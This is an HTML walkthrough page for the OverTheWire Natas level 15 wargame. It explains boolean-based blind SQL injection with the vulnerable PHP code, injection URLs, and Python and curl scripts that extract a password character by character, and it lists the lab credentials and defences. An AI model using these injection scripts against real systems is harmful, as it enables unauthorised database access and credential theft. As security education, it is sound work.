@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Natas 15 → 16 | Blind SQL Injection</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=JetBrains+Mono:wght@400;500&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+<style>
+  /* Same base styles */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  :root {
+    --bg: #0a0e14; --bg-card: #111820; --bg-surface: #1a2330;
+    --border: #283340; --border-light: #2d3b4a;
+    --text-primary: #e8edf5; --text-secondary: #9aaec9; --text-muted: #5d738b;
+    --accent-cyan: #6bc4ff; --accent-green: #4ade80; --accent-yellow: #facc15;
+    --accent-rose: #f472b6; --accent-purple: #a78bfa; --accent-orange: #fb923c;
+    --font-body: 'Inter', sans-serif; --font-mono: 'JetBrains Mono', monospace;
+    --font-display: 'Space Grotesk', sans-serif;
+    --radius: 12px; --radius-sm: 8px; --transition: 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+  html { scroll-behavior: smooth; }
+  body { background: var(--bg); color: var(--text-primary); font-family: var(--font-body); font-size: 15px; line-height: 1.7; -webkit-font-smoothing: antialiased; }
+  ::-webkit-scrollbar { width: 6px; height: 6px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--border-light); }
+
+  header {
+    padding: 2.5rem 2rem 1.8rem;
+    border-bottom: 1px solid var(--border);
+    background: radial-gradient(ellipse at 50% 0%, #162033 0%, var(--bg) 70%);
+    position: relative;
+  }
+  header::after {
+    content: ''; position: absolute; bottom: 0; left: 0; right: 0;
+    height: 1px; background: linear-gradient(90deg, transparent, var(--accent-cyan), transparent);
+    opacity: 0.15;
+  }
+  .top-nav {
+    display: flex; justify-content: space-between; align-items: center;
+    flex-wrap: wrap; gap: 1rem; max-width: 900px; margin: 0 auto;
+  }
+  .back-link {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    text-decoration: none; transition: all var(--transition);
+    display: inline-flex; align-items: center; gap: 0.4rem;
+  }
+  .back-link:hover { color: var(--accent-cyan); }
+  .back-link svg { width: 14px; height: 14px; fill: currentColor; }
+  .level-badge {
+    font-family: var(--font-mono); font-size: 0.65rem; font-weight: 500;
+    letter-spacing: 0.15em; color: var(--accent-green);
+    background: rgba(74, 222, 128, 0.06); padding: 0.2rem 0.8rem;
+    border-radius: 20px; border: 1px solid rgba(74, 222, 128, 0.1);
+  }
+  h1 {
+    font-family: var(--font-display); font-size: clamp(1.6rem, 3.5vw, 2.4rem);
+    font-weight: 700; max-width: 900px; margin: 0.8rem auto 0.1rem;
+    letter-spacing: -0.02em;
+  }
+  h1 span {
+    background: linear-gradient(135deg, var(--accent-cyan), var(--accent-purple));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  .level-sub {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    max-width: 900px; margin: 0 auto;
+  }
+
+  main { max-width: 900px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; }
+  .level {
+    border: 1px solid var(--border); border-radius: var(--radius);
+    overflow: hidden; background: var(--bg-card); transition: border-color var(--transition);
+  }
+  .level:hover { border-color: var(--border-light); }
+  .level-header {
+    display: flex; align-items: center; gap: 1rem; padding: 1.2rem 1.5rem;
+    border-bottom: 1px solid var(--border); background: var(--bg-surface); flex-wrap: wrap;
+  }
+  .level-num {
+    font-family: var(--font-mono); font-size: 1.1rem; font-weight: 500;
+    color: var(--accent-cyan); min-width: 2.4rem;
+  }
+  .level-title {
+    font-family: var(--font-display); font-size: 1rem; font-weight: 600;
+    color: var(--text-primary); flex: 1; letter-spacing: -0.01em;
+  }
+  .difficulty {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    letter-spacing: 0.08em; padding: 0.15rem 0.7rem; border-radius: 20px;
+    text-transform: uppercase;
+  }
+  .diff-hard { background: rgba(244, 114, 182, 0.08); color: var(--accent-rose); border: 1px solid rgba(244, 114, 182, 0.12); }
+
+  .level-body { padding: 1.8rem; }
+  .slabel {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    letter-spacing: 0.2em; text-transform: uppercase; color: var(--text-muted);
+    margin-bottom: 0.5rem; margin-top: 1.5rem;
+  }
+  .slabel:first-child { margin-top: 0; }
+  p { color: var(--text-secondary); margin-bottom: 0.4rem; font-size: 0.95rem; }
+
+  .concepts { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-bottom: 0.2rem; }
+  .concept {
+    display: inline-block; font-family: var(--font-mono); font-size: 0.65rem;
+    font-weight: 500; padding: 0.15rem 0.6rem; border-radius: 20px;
+    background: rgba(167, 139, 250, 0.06); color: var(--accent-purple);
+    border: 1px solid rgba(167, 139, 250, 0.1);
+  }
+
+  .code-block {
+    background: #0d1117; border: 1px solid var(--border);
+    border-radius: var(--radius-sm); padding: 1rem 1.25rem;
+    font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-secondary);
+    overflow-x: auto; margin: 0.8rem 0; line-height: 1.8;
+    position: relative;
+  }
+  .code-block .kw { color: var(--accent-cyan); }
+  .code-block .val { color: var(--accent-green); }
+  .code-block .str { color: var(--accent-yellow); }
+  .code-block .tag { color: var(--accent-rose); }
+  .code-block .cmt { color: var(--text-muted); font-style: italic; }
+  .code-block .num { color: var(--accent-orange); }
+
+  .hint {
+    background: rgba(107, 196, 255, 0.04); border-left: 3px solid var(--accent-cyan);
+    border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+    padding: 0.75rem 1rem; font-size: 0.88rem; color: var(--text-secondary);
+    margin: 0.8rem 0;
+  }
+
+  ol.steps {
+    list-style: none; counter-reset: s;
+    display: flex; flex-direction: column; gap: 0.5rem; margin: 0.75rem 0;
+  }
+  ol.steps li {
+    counter-increment: s; display: flex; gap: 0.75rem;
+    align-items: flex-start; color: var(--text-secondary); font-size: 0.95rem;
+  }
+  ol.steps li::before {
+    content: counter(s); font-family: var(--font-mono); font-size: 0.65rem;
+    font-weight: 600; background: rgba(107, 196, 255, 0.06);
+    color: var(--accent-cyan); border-radius: 50%; min-width: 24px; height: 24px;
+    display: flex; align-items: center; justify-content: center;
+    margin-top: 0.1rem; flex-shrink: 0; border: 1px solid rgba(107, 196, 255, 0.08);
+  }
+
+  .pw-box {
+    display: flex; align-items: center; gap: 0.75rem;
+    background: rgba(74, 222, 128, 0.04); border: 1px solid rgba(74, 222, 128, 0.08);
+    border-radius: var(--radius-sm); padding: 0.6rem 1rem; margin-top: 0.4rem;
+  }
+  .pw-box .lbl {
+    font-family: var(--font-mono); font-size: 0.6rem; font-weight: 500;
+    color: var(--accent-green); letter-spacing: 0.1em; text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .pw-box .pw {
+    font-family: var(--font-mono); font-size: 0.82rem; color: var(--text-primary);
+    word-break: break-all;
+  }
+
+  .lessons-grid {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 0.8rem;
+  }
+  .lesson-card {
+    background: #0d1117; border: 1px solid var(--border);
+    border-radius: var(--radius-sm); padding: 0.9rem 1rem;
+    transition: border-color var(--transition);
+  }
+  .lesson-card:hover { border-color: var(--border-light); }
+  .lesson-card .lc-title {
+    font-family: var(--font-mono); font-size: 0.65rem; font-weight: 500;
+    color: var(--accent-cyan); margin-bottom: 0.2rem;
+  }
+  .lesson-card p { font-size: 0.85rem; color: var(--text-secondary); margin: 0; }
+
+  code {
+    font-family: var(--font-mono); background: rgba(107, 196, 255, 0.06);
+    color: var(--accent-cyan); padding: 0.05rem 0.4rem; border-radius: 4px;
+    font-size: 0.85em;
+  }
+
+  .nav-levels {
+    display: flex; justify-content: space-between; margin-top: 2rem;
+    padding-top: 1.5rem; border-top: 1px solid var(--border);
+  }
+  .nav-levels a {
+    font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted);
+    text-decoration: none; padding: 0.4rem 0.8rem; border-radius: var(--radius-sm);
+    transition: all var(--transition);
+  }
+  .nav-levels a:hover { color: var(--accent-cyan); background: rgba(107, 196, 255, 0.04); }
+
+  footer {
+    text-align: center; padding: 2.5rem 2rem; color: var(--text-muted);
+    font-family: var(--font-mono); font-size: 0.7rem;
+    border-top: 1px solid var(--border); letter-spacing: 0.05em;
+  }
+
+  @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+  .level { animation: fadeUp 0.5s ease backwards; }
+
+  @media (max-width: 600px) {
+    .top-nav { flex-direction: column; align-items: stretch; text-align: center; }
+    .level-header { flex-wrap: wrap; }
+    .level-body { padding: 1.2rem; }
+    .lessons-grid { grid-template-columns: 1fr; }
+    .nav-levels { flex-direction: column; gap: 0.5rem; text-align: center; }
+    header { padding: 1.8rem 1.2rem 1.2rem; }
+    main { padding: 1.5rem 1rem 3rem; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="top-nav">
+    <a href="../index.html" class="back-link">
+      <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      Back to Levels
+    </a>
+    <span class="level-badge">Natas 15 → 16</span>
+  </div>
+  <h1>Level <span>15</span></h1>
+  <p class="level-sub">// Blind SQL Injection — Boolean-Based</p>
+</header>
+
+<!-- ===== DEVELOPER CREDIT ===== -->
+<div style="display:flex; justify-content:center; align-items:center; gap:0.6rem; padding:0.6rem 1rem; background:var(--bg-surface); border-bottom:1px solid var(--border); max-width:900px; margin:0 auto 0.5rem; border-radius:var(--radius-sm);">
+  <span style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); letter-spacing:0.05em;">🚀</span>
+  <span style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted);">Crafted by</span>
+  <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.65rem; font-weight:600; color:var(--accent-cyan); text-decoration:none; transition:all 0.3s;" onmouseover="this.style.color='var(--accent-purple)'" onmouseout="this.style.color='var(--accent-cyan)'">Leo</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">⚡</span>
+  <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">GitHub</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">·</span>
+  <a href="https://www.linkedin.com/in/ilya-farahani-2160103b0" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">LinkedIn</a>
+  <span style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted);">·</span>
+  <a href="https://t.me/Here_is_leo" target="_blank" style="font-family:var(--font-mono); font-size:0.5rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Telegram</a>
+</div>
+
+<main>
+  <div class="level">
+    <div class="level-header">
+      <span class="level-num">15</span>
+      <span class="level-title">Blind SQL Injection — Boolean-Based</span>
+      <span class="difficulty diff-hard">Hard</span>
+    </div>
+    <div class="level-body">
+
+      <p class="slabel">// Key Concepts</p>
+      <div class="concepts">
+        <span class="concept">Blind SQL Injection</span>
+        <span class="concept">Boolean-Based Blind</span>
+        <span class="concept">Time-Based Blind</span>
+        <span class="concept">Data Exfiltration</span>
+        <span class="concept">Automation</span>
+      </div>
+
+      <p class="slabel">// Challenge Overview</p>
+      <p>This level builds on Level 14 but now the application <strong>does not display</strong> the query results. Instead, it only returns a success or failure message based on whether a user exists in the database. This is a <strong>Blind SQL Injection</strong> — we can't see the data directly, but we can infer it by asking true/false questions.</p>
+
+      <p class="slabel">// Initial Analysis</p>
+      <p>View the source code to understand the behavior:</p>
+
+      <div class="code-block">
+<span class="cmt">&lt;?php</span>
+<span class="kw">if</span>(<span class="kw">array_key_exists</span>(<span class="str">"username"</span>, <span class="kw">$_GET</span>)) {
+    <span class="kw">$query</span> = <span class="str">"SELECT * FROM users WHERE username='"</span> . <span class="kw">$_GET</span>[<span class="str">'username'</span>] . <span class="str">"'"</span>;
+    <span class="kw">$result</span> = <span class="kw">mysql_query</span>(<span class="kw">$query</span>);
+    <span class="kw">if</span>(<span class="kw">mysql_num_rows</span>(<span class="kw">$result</span>) > <span class="num">0</span>) {
+        <span class="kw">print</span> <span class="str">"This user exists."</span>;
+    } <span class="kw">else</span> {
+        <span class="kw">print</span> <span class="str">"This user doesn't exist."</span>;
+    }
+}
+<span class="cmt">?&gt;</span>
+      </div>
+
+      <p>The application only tells us whether a username exists or not. This is a classic example of <strong>Boolean-based Blind SQL Injection</strong>.</p>
+
+      <div class="hint">💡 In Blind SQL Injection, the application doesn't return data directly. Instead, we can ask the database yes/no questions and infer the answer based on the application's response.</div>
+
+      <p class="slabel">// Understanding Blind SQL Injection</p>
+      <p>We can use SQL's <code>CASE</code> statement or conditional logic to ask questions about the data:</p>
+      <ul style="margin:0.5rem 0 0 1.2rem;color:var(--text-secondary);font-size:0.95rem;">
+        <li><strong>True condition:</strong> The user exists → "This user exists"</li>
+        <li><strong>False condition:</strong> The user doesn't exist → "This user doesn't exist"</li>
+      </ul>
+
+      <p>By crafting queries that evaluate to true only when a specific condition is met, we can extract information one bit at a time.</p>
+
+      <p class="slabel">// Solution Walkthrough</p>
+      <p><strong>Step 1 — Confirm the username exists:</strong></p>
+      <div class="code-block">
+http://natas15.natas.labs.overthewire.org/?username=<span class="val">natas16</span>
+<span class="cmt"># Response: "This user exists."</span>
+      </div>
+
+      <p><strong>Step 2 — Query the password length:</strong></p>
+      <div class="code-block">
+http://natas15.natas.labs.overthewire.org/?username=<span class="val">natas16' AND LENGTH(password)=32 -- </span>
+      </div>
+
+      <p><strong>Step 3 — Extract characters one by one:</strong></p>
+      <div class="code-block">
+<span class="cmt"># Check if the first character is 'a' (ASCII 97)</span>
+http://natas15.natas.labs.overthewire.org/?username=<span class="val">natas16' AND ASCII(SUBSTRING(password,1,1))=97 -- </span>
+
+<span class="cmt"># Check if the first character is 'b' (ASCII 98)</span>
+http://natas15.natas.labs.overthewire.org/?username=<span class="val">natas16' AND ASCII(SUBSTRING(password,1,1))=98 -- </span>
+
+<span class="cmt"># Continue for each character</span>
+      </div>
+
+      <p><strong>Step 4 — Automate with Python:</strong></p>
+      <div class="code-block">
+<span class="kw">import</span> requests
+<span class="kw">import</span> string
+
+url = <span class="str">"http://natas15.natas.labs.overthewire.org/"</span>
+auth = (<span class="str">"natas15"</span>, <span class="str">"AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"</span>)
+
+<span class="cmt"># Characters that can appear in the password</span>
+charset = string.ascii_letters + string.digits
+
+<span class="cmt"># Query the username to confirm it exists</span>
+params = {<span class="str">"username"</span>: <span class="str">"natas16"</span>}
+response = requests.get(url, auth=auth, params=params)
+<span class="kw">print</span>(response.text)  <span class="cmt"># Should show "This user exists."</span>
+
+<span class="cmt"># Blind SQL injection to extract the password</span>
+password = <span class="str">""</span>
+<span class="kw">for</span> position <span class="kw">in</span> <span class="kw">range</span>(<span class="num">1</span>, <span class="num">33</span>):
+    <span class="kw">for</span> char <span class="kw">in</span> charset:
+        payload = <span class="str">f"natas16' AND SUBSTRING(password, {position}, 1) = '{char}' -- "</span>
+        params = {<span class="str">"username"</span>: payload}
+        response = requests.get(url, auth=auth, params=params)
+
+        <span class="kw">if</span> <span class="str">"This user exists"</span> <span class="kw">in</span> response.text:
+            password += char
+            <span class="kw">print</span>(<span class="str">f"Position {position}: {char}"</span>)
+            <span class="kw">break</span>
+
+<span class="kw">print</span>(<span class="str">f"Password: {password}"</span>)
+      </div>
+
+      <p><strong>Or using a more efficient approach with ASCII values:</strong></p>
+      <div class="code-block">
+<span class="kw">import</span> requests
+
+url = <span class="str">"http://natas15.natas.labs.overthewire.org/"</span>
+auth = (<span class="str">"natas15"</span>, <span class="str">"AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"</span>)
+
+password = <span class="str">""</span>
+<span class="kw">for</span> i <span class="kw">in</span> <span class="kw">range</span>(<span class="num">1</span>, <span class="num">33</span>):
+    <span class="kw">for</span> c <span class="kw">in</span> <span class="kw">range</span>(<span class="num">48</span>, <span class="num">123</span>):  <span class="cmt"># ASCII 48-122 (0-9, A-Z, a-z)</span>
+        payload = <span class="str">f"natas16' AND ASCII(SUBSTRING(password, {i}, 1)) = {c} -- "</span>
+        params = {<span class="str">"username"</span>: payload}
+        response = requests.get(url, auth=auth, params=params)
+
+        <span class="kw">if</span> <span class="str">"This user exists"</span> <span class="kw">in</span> response.text:
+            password += <span class="kw">chr</span>(c)
+            <span class="kw">print</span>(<span class="str">f"Found: {password}"</span>)
+            <span class="kw">break</span>
+
+<span class="kw">print</span>(<span class="str">f"Complete password: {password}"</span>)
+      </div>
+
+      <p><strong>Using curl with conditional queries:</strong></p>
+      <div class="code-block">
+<span class="cmt"># Check if the first character is 'W'</span>
+curl -u <span class="val">natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span> \
+  "http://natas15.natas.labs.overthewire.org/?username=<span class="val">natas16' AND SUBSTRING(password,1,1)='W' -- </span>"
+      </div>
+
+      <p class="slabel">// Why It Works</p>
+      <p>The blind SQL injection works because:</p>
+      <ul style="margin:0.5rem 0 0 1.2rem;color:var(--text-secondary);font-size:0.95rem;">
+        <li><strong>Input is not sanitized:</strong> User input is concatenated into the query.</li>
+        <li><strong>Different responses:</strong> The application gives different outputs based on the query result.</li>
+        <li><strong>Conditional logic can be injected:</strong> We can add conditions that return true or false.</li>
+        <li><strong>Information is leaked bit by bit:</strong> Each query reveals one bit of information.</li>
+      </ul>
+
+      <p class="slabel">// Types of Blind SQL Injection</p>
+      <div style="background:#0d1117;border:1px solid var(--border);border-radius:var(--radius-sm);padding:1rem;margin-top:0.5rem;">
+        <table style="width:100%;border-collapse:collapse;font-size:0.85rem;color:var(--text-secondary);">
+          <tr style="border-bottom:1px solid var(--border);">
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Type</th>
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Detection Method</th>
+            <th style="text-align:left;padding:0.4rem 0.5rem;font-family:var(--font-mono);font-size:0.7rem;color:var(--text-muted);">Extraction Method</th>
+          </tr>
+          <tr><td style="padding:0.3rem 0.5rem;">Boolean-Based</td><td style="padding:0.3rem 0.5rem;">True/False responses</td><td style="padding:0.3rem 0.5rem;">Conditional queries</td></tr>
+          <tr style="border-top:1px solid var(--border);"><td style="padding:0.3rem 0.5rem;">Time-Based</td><td style="padding:0.3rem 0.5rem;">Response time differences</td><td style="padding:0.3rem 0.5rem;"><code>SLEEP()</code> or <code>BENCHMARK()</code></td></tr>
+          <tr style="border-top:1px solid var(--border);"><td style="padding:0.3rem 0.5rem;">Error-Based</td><td style="padding:0.3rem 0.5rem;">Error messages</td><td style="padding:0.3rem 0.5rem;">Extract from error responses</td></tr>
+        </table>
+      </div>
+
+      <p class="slabel">// Defensive Measures</p>
+      <ul style="margin:0.5rem 0 0 1.2rem;color:var(--text-secondary);font-size:0.95rem;">
+        <li><strong>Use prepared statements</strong> with parameterized queries.</li>
+        <li><strong>Input validation:</strong> Validate and sanitize all user input.</li>
+        <li><strong>Error handling:</strong> Provide generic error messages, don't reveal database details.</li>
+        <li><strong>Rate limiting:</strong> Limit the number of queries per user to prevent automated extraction.</li>
+        <li><strong>Use a web application firewall (WAF)</strong> to detect and block SQL injection attempts.</li>
+      </ul>
+
+      <p class="slabel">// Credentials</p>
+      <div class="pw-box">
+        <span class="lbl">natas15</span>
+        <span class="pw">AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</span>
+      </div>
+      <div class="pw-box">
+        <span class="lbl">natas16</span>
+        <span class="pw">WaIHEacj63wnNIBROHeqi3p9t0m5nhmh</span>
+      </div>
+
+      <p class="slabel">// Key Takeaways</p>
+      <div class="lessons-grid">
+        <div class="lesson-card">
+          <div class="lc-title">🔍 Blind SQL Injection Is Stealthy</div>
+          <p>Even when applications don't display data, attackers can extract information one bit at a time using blind techniques.</p>
+        </div>
+        <div class="lesson-card">
+          <div class="lc-title">🛡️ Prevention Is Essential</div>
+          <p>Use parameterized queries to completely prevent SQL injection. No other defense is as effective.</p>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="nav-levels">
+    <a href="level-14.html">← Previous Level</a>
+    <a href="#" class="nav-disabled">Next Level →</a>
+  </div>
+</main>
+
+<footer>
+  OverTheWire — Natas Writeup &middot; For Educational Purposes Only
+</footer>
+
+<!-- ===== DEVELOPER FOOTER ===== -->
+<footer style="border-top:1px solid var(--border); padding:2rem 2rem 1.5rem; margin-top:2rem;">
+  <div style="display:flex; flex-direction:column; align-items:center; gap:0.8rem; max-width:900px; margin:0 auto;">
+    <div style="display:flex; align-items:center; gap:0.6rem; flex-wrap:wrap; justify-content:center;">
+      <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted);">Developed with</span>
+      <span style="color:var(--accent-rose);">❤️</span>
+      <span style="font-family:var(--font-mono); font-size:0.7rem; color:var(--text-muted);">by</span>
+      <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-display); font-size:0.9rem; font-weight:700; color:var(--accent-cyan); text-decoration:none; transition:all 0.3s;" onmouseover="this.style.color='var(--accent-purple)'" onmouseout="this.style.color='var(--accent-cyan)'">Leo</a>
+    </div>
+    <div style="display:flex; gap:1.2rem; flex-wrap:wrap; justify-content:center;">
+      <a href="https://github.com/this-is-the-leo" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">GitHub</a>
+      <span style="color:var(--border);">|</span>
+      <a href="https://www.linkedin.com/in/ilya-farahani-2160103b0" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">LinkedIn</a>
+      <span style="color:var(--border);">|</span>
+      <a href="https://t.me/Here_is_leo" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Telegram</a>
+      <span style="color:var(--border);">|</span>
+      <a href="mailto:ilyafarahani9@gmail.com" target="_blank" style="font-family:var(--font-mono); font-size:0.6rem; color:var(--text-muted); text-decoration:none; transition:color 0.2s;" onmouseover="this.style.color='var(--accent-cyan)'" onmouseout="this.style.color='var(--text-muted)'">Email</a>
+    </div>
+    <div style="font-family:var(--font-mono); font-size:0.55rem; color:var(--text-muted); letter-spacing:0.05em; opacity:0.6;">&copy; 2025 Leo · OverTheWire Natas Writeup · For Educational Purposes Only</div>
+  </div>
+</footer>
+
+</body>
+</html>
